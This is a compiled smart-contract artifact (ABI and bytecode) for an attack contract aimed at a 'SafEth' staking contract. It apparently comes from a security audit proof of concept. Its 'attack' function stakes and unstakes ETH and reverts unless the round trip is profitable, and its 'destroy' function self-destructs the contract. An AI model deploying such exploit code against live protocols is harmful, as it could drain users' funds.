{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract SafEth",
          "name": "_safETH",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "destroy",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x60c060405234801561001057600080fd5b5060405161032038038061032083398101604081905261002f91610044565b6001600160a01b03166080523360a052610074565b60006020828403121561005657600080fd5b81516001600160a01b038116811461006d57600080fd5b9392505050565b60805160a05161028261009e6000396000606c015260008181609a015261011e01526102826000f3fe60806040526004361061002d5760003560e01c806383197ef0146100395780639e5faafc1461005057600080fd5b3661003457005b600080fd5b34801561004557600080fd5b5061004e61006a565b005b610058610096565b60405190815260200160405180910390f35b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316ff5b60007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633a4b66f1346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100f357600080fd5b505af1158015610107573d6000803e3d6000fd5b50506040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169350632e17de7892508391506370a0823190602401602060405180830381865afa158015610178573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019c9190610233565b6040518263ffffffff1660e01b81526004016101ba91815260200190565b600060405180830381600087803b1580156101d457600080fd5b505af11580156101e8573d6000803e3d6000fd5b505050504790503481116102305760405162461bcd60e51b815260206004820152600b60248201526a2170726f66697461626c6560a81b604482015260640160405180910390fd5b90565b60006020828403121561024557600080fd5b505191905056fea2646970667358221220e21701f4ba438340e26f11a9ed1cd8beefeaa513a197a75e707e23e92feda96d64736f6c63430008110033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack()": "9e5faafc",
    "destroy()": "83197ef0"
  },
  "id": 0
}